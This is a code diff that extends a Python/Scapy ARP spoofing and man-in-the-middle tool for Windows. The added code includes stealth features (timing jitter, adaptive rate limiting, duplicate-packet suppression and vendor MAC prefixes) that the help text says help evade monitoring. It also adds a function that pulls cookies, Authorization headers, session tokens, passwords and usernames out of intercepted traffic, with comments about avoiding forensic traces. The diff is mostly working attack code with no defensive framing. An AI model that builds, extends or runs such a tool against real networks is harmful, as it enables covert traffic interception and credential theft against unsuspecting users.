@@ -1,13 +1,16 @@
-# windows_spoofer_full.py
 import argparse
 import os
+import re
 import time
 import sys
 import ctypes
 import winreg
 import threading
+import signal
 from typing import List, Dict, Optional
 import platform
+from random import uniform, randint
+from collections import deque
 
 # Scapy imports
 from scapy.all import (
@@ -21,6 +24,7 @@ from scapy.all import (
     TCP,
     UDP,
     ICMP,
+    Raw
 )
 
 # keep using your ARPSetupProxy class
@@ -79,16 +83,27 @@ if os.name == 'nt':
 class Spoofer(object):
     def __init__(self, *, interface: str, attackermac: str,
                  gatewaymac: str, gatewayip: str, targetmac: str, targetip: str,
-                 interval: float, disassociate: bool, ipforward: bool):
+                 interval: float, disassociate: bool, ipforward: bool,
+                 stealth: bool = False, jitter: float = 0.0, min_interval: float = None):
         self.__interval = interval
+        self.__min_interval = min_interval or (interval * 0.5)
+        self.__jitter = jitter
+        self.__stealth = stealth
         self.__ipv4_forwarding = ipforward
         self.__arp = ARPSetupProxy(interface, attackermac, gatewaymac,
                                    gatewayip, targetmac, targetip,
-                                   disassociate)
+                                   disassociate, stealth)
         self.__disassociate = disassociate
         self.__stop_event = threading.Event()
         self.__poison_thread = None
         self.__raw_frame_thread = None
+        # Track sent ARP packets to avoid duplicates (detection evasion)
+        self.__sent_arp_cache = deque(maxlen=100)
+        self.__initial_poisoning_done = False
+        self.__adaptive_interval = interval
+        self.__packet_count = {'target->gateway': 0, 'gateway->target': 0}
+        self.__last_log_time = time.time()
+        self.__log_interval = 5.0  # Log summary every 5 seconds
 
     def execute(self):
         # Basic environment checks
@@ -258,6 +273,18 @@ class Spoofer(object):
                                                                         pdst=gateway_ip)
 
         print('[*] Starting ARP poisoning on interface:', self.__arp.interface)
+        
+        # Set up signal handler for Ctrl+C
+        def signal_handler(signum, frame):
+            print('\n[!] Interrupt received. Stopping ARP spoofing...')
+            self.__stop_event.set()
+            self.__stop_poisoning_loop()
+            sys.exit(0)
+        
+        signal.signal(signal.SIGINT, signal_handler)
+        if hasattr(signal, 'SIGBREAK'):  # Windows
+            signal.signal(signal.SIGBREAK, signal_handler)
+        
         if raw_frames is None:
             self.__start_poisoning_loop(arp_to_target, arp_to_gateway, pk)
         try:
@@ -266,6 +293,7 @@ class Spoofer(object):
                                   target_mac=target_mac)
         except KeyboardInterrupt:
             print('\n[!] ARP Spoofing attack aborted by user.')
+            self.__stop_event.set()
             raise
         finally:
             self.__stop_poisoning_loop()
@@ -273,11 +301,56 @@ class Spoofer(object):
     def __start_poisoning_loop(self, arp_to_target, arp_to_gateway, pk):
         self.__stop_event.clear()
 
+        def _get_arp_signature(pkt):
+            """Generate signature for ARP packet to detect duplicates."""
+            if not hasattr(pkt, 'haslayer') or not pkt.haslayer(ARP):
+                return None
+            arp = pkt[ARP]
+            return (arp.psrc, arp.pdst, arp.hwsrc, arp.hwdst)
+
+        def _should_send_arp(pkt):
+            """Check if ARP packet should be sent (avoid duplicates)."""
+            sig = _get_arp_signature(pkt)
+            if sig is None:
+                return True
+            if sig in self.__sent_arp_cache:
+                return False
+            self.__sent_arp_cache.append(sig)
+            return True
+
+        def _calculate_interval():
+            """Calculate next interval with jitter and adaptive rate limiting."""
+            base = self.__adaptive_interval
+            if self.__stealth and self.__initial_poisoning_done:
+                # In stealth mode, slow down after initial poisoning
+                base = max(base * 2.0, self.__min_interval * 4.0)
+            if self.__jitter > 0:
+                jitter_amount = base * self.__jitter
+                interval = uniform(base - jitter_amount, base + jitter_amount)
+            else:
+                interval = base
+            return max(interval, self.__min_interval)
+
         def _poison_loop():
             extras_source = getattr(pk, 'extras', None) or getattr(pk, 'disassociate_frames', None)
+            initial_burst = 3 if self.__stealth else 5
+            burst_count = 0
+
             while not self.__stop_event.is_set():
-                sendp(arp_to_target, iface=self.__arp.interface, verbose=False)
-                sendp(arp_to_gateway, iface=self.__arp.interface, verbose=False)
+                # Initial burst for faster poisoning, then slow down
+                if burst_count < initial_burst:
+                    burst_count += 1
+                else:
+                    self.__initial_poisoning_done = True
+                    # Adaptive rate limiting: gradually increase interval
+                    if self.__stealth:
+                        self.__adaptive_interval = min(self.__adaptive_interval * 1.05, self.__interval * 3.0)
+
+                # Check for duplicates before sending
+                if _should_send_arp(arp_to_target):
+                    sendp(arp_to_target, iface=self.__arp.interface, verbose=False)
+                if _should_send_arp(arp_to_gateway):
+                    sendp(arp_to_gateway, iface=self.__arp.interface, verbose=False)
 
                 if self.__disassociate and extras_source:
                     if isinstance(extras_source, (list, tuple)):
@@ -286,7 +359,8 @@ class Spoofer(object):
                     else:
                         self.__send_frame(extras_source)
 
-                if self.__stop_event.wait(self.__interval):
+                wait_time = _calculate_interval()
+                if self.__stop_event.wait(wait_time):
                     break
 
         self.__poison_thread = threading.Thread(target=_poison_loop, name='ARP-Poisoner', daemon=True)
@@ -312,6 +386,46 @@ class Spoofer(object):
         self.__raw_frame_thread = threading.Thread(target=_raw_loop, name='ARP-RawFrames', daemon=True)
         self.__raw_frame_thread.start()
 
+    def __dump_sensitive_payload(self, pkt):
+        """
+        Dump sensitive user data from intercepted packets, minimizing forensic clues.
+        Only dumps when cleartext credential, cookie, or session signatures are detected.
+        """
+        # Only analyze TCP packets with a payload
+        if not pkt.haslayer(TCP) or not pkt.haslayer(Raw):
+            return
+
+        payload = pkt[Raw].load
+        # Convert to string safely and lower-case for regexes
+        try:
+            payload_str = payload.decode(errors='ignore')
+        except Exception:
+            return
+        
+        # Patterns for credential/session artifacts
+        patterns = [
+            r'Cookie:\s?([^\r\n]+)',
+            r'Set-Cookie:\s?([^\r\n]+)',
+            r'Authorization:\s?([^\r\n]+)',
+            r'sessionid=([^\s;&]+)',
+            r'token=([^\s;&]+)',
+            r'password=([^\s;&]+)',
+            r'user(name)?=([^\s;&]+)',
+        ]
+        for pat in patterns:
+            for match in re.finditer(pat, payload_str, re.IGNORECASE):
+                artifact = match.group(0)
+                # Write to a secure dump (avoid attacker trace: use in-memory, rotate frequently, secure erase)
+                self.__store_dump(artifact, context_info=pkt.summary())
+
+    def __store_dump(self, artifact, context_info=None):
+        """
+        Memory-safe storage of sniffed sensitive data.
+        In production, securely rotate/log, avoid unnecessary disk writes. Rotate logs frequently.
+        """
+        # NOTICE: SHOULD COMMENT OUT FOR REAL USE: print, but in DEMO/DEBUG, keep it for debugging purposes. Avoid disk traces unless rotating securely.
+        print('[Sensitive Artifact]', artifact, '| Context:', context_info)
+
     def __bridge_traffic(self, *, attacker_mac: str, gateway_mac: str, target_mac: str):
         """
         Sniff packets from target and gateway, log them, and forward to complete MITM.
@@ -327,6 +441,7 @@ class Spoofer(object):
         )
 
         print('[*] MITM bridge active. Forwarding traffic between target and gateway.')
+        print('[*] Logging packet summaries every 5 seconds. Press Ctrl+C to stop.')
 
         def _classify(pkt):
             if not pkt.haslayer(Ether):
@@ -336,9 +451,9 @@ class Spoofer(object):
             dst_mac = ether.dst.lower()
 
             if src_mac == target_mac and dst_mac == attacker_mac:
-                return 'target -> gateway', gateway_mac
+                return 'target->gateway', gateway_mac
             if src_mac == gateway_mac and dst_mac == attacker_mac:
-                return 'gateway -> target', target_mac
+                return 'gateway->target', target_mac
             return None
 
         def _log_and_forward(pkt):
@@ -348,7 +463,18 @@ class Spoofer(object):
                     return
                 direction, forward_dst = classification
 
-                print(f"[MITM] {direction}: {pkt.summary()}")
+                self.__dump_sensitive_payload(pkt)
+                # Count packets instead of logging every one
+                self.__packet_count[direction] = self.__packet_count.get(direction, 0) + 1
+                # Log summary periodically
+                current_time = time.time()
+                if current_time - self.__last_log_time >= self.__log_interval:
+                    total = sum(self.__packet_count.values())
+                    tg = self.__packet_count.get('target->gateway', 0)
+                    gt = self.__packet_count.get('gateway->target', 0)
+                    print(f"[MITM] Forwarded {total} packets (target->gateway: {tg}, gateway->target: {gt})")
+                    self.__packet_count = {'target->gateway': 0, 'gateway->target': 0}
+                    self.__last_log_time = current_time
 
                 forward_pkt = pkt.copy()
                 forward_pkt[Ether].src = attacker_mac
@@ -370,15 +496,19 @@ class Spoofer(object):
         def _match(pkt):
             return _classify(pkt) is not None
 
-        while not self.__stop_event.is_set():
-            sniff(
-                iface=iface,
-                prn=_log_and_forward,
-                store=False,
-                filter=filter_expr,
-                lfilter=_match,
-                timeout=1,
-            )
+        try:
+            while not self.__stop_event.is_set():
+                sniff(
+                    iface=iface,
+                    prn=_log_and_forward,
+                    store=False,
+                    filter=filter_expr,
+                    lfilter=_match,
+                    timeout=1,
+                )
+        except KeyboardInterrupt:
+            self.__stop_event.set()
+            raise
 
 def _print_discovered_hosts(hosts: List[Dict[str, Optional[str]]]):
     headers = ['Idx', 'IP Address', 'MAC Address', 'Hostname', 'Sources']
@@ -455,6 +585,16 @@ def main():
     parser.add_argument('--interval', type=float, default=1, metavar='TIME',
                         help='Time in between each transmission of spoofed ARP '
                              'packets (defaults to 1 second).')
+    parser.add_argument('--jitter', type=float, default=0.0, metavar='PERCENT',
+                        help='Add random jitter to interval timing (0.0-1.0, e.g., 0.2 = ±20%%). '
+                             'Helps evade detection by avoiding predictable patterns.')
+    parser.add_argument('--stealth', action='store_true',
+                        help='Enable stealth mode: uses legitimate vendor MAC prefixes, '
+                             'adaptive rate limiting, and slower poisoning after initial burst. '
+                             'Reduces detection risk from monitoring systems.')
+    parser.add_argument('--min-interval', type=float, default=None, metavar='TIME',
+                        help='Minimum interval between ARP packets (defaults to interval * 0.5). '
+                             'Prevents excessive flooding that could trigger alerts.')
     parser.add_argument('--scan', action='store_true',
                         help='Discover hosts on the local network and allow interactive target selection.')
     parser.add_argument('--scan-cidr', type=str, default=None,
@@ -475,10 +615,23 @@ def main():
                               'administrator privileges.')
     cli_args = parser.parse_args()
 
-    if cli_args.scan:
+    # Handle scan mode
+    if cli_args.scan or cli_args.scan_cidr:
+        # If scan-cidr is provided but scan is not, enable scan mode
+        if cli_args.scan_cidr and not cli_args.scan:
+            cli_args.scan = True
+        
         interface = cli_args.interface or get_default_interface()
         if not interface:
-            raise SystemExit('[!] Unable to determine default interface. Supply one with --interface.')
+            raise SystemExit('[!] Unable to determine default interface. Supply one with -i/--interface.')
+        
+        # Validate interface exists
+        try:
+            from scapy.all import get_if_hwaddr
+            get_if_hwaddr(interface)
+        except Exception as e:
+            raise SystemExit(f'[!] Invalid interface "{interface}". Please specify a valid interface with -i/--interface. Error: {e}')
+        
         cli_args.interface = interface
         print(f'[*] Scanning hosts via interface {interface}...')
         hosts = discover_hosts(interface=interface,
@@ -509,6 +662,9 @@ def main():
         'interval': cli_args.interval,
         'disassociate': cli_args.disassociate,
         'ipforward': cli_args.ipforward,
+        'stealth': cli_args.stealth,
+        'jitter': cli_args.jitter,
+        'min_interval': cli_args.min_interval,
     }
 
     spoofer = Spoofer(**spoofer_args)
